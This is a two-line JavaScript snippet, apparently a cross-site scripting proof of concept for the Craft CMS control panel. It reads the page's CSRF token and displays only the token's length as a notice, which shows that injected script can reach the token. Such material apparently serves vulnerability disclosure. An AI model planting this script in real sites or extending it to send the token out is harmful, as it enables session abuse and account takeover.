const token = document.querySelector("input[name='CRAFT_CSRF_TOKEN']")?.value || "";
Craft.cp.displayNotice("XSS PoC:<br>CSRF token length: " + token.length);
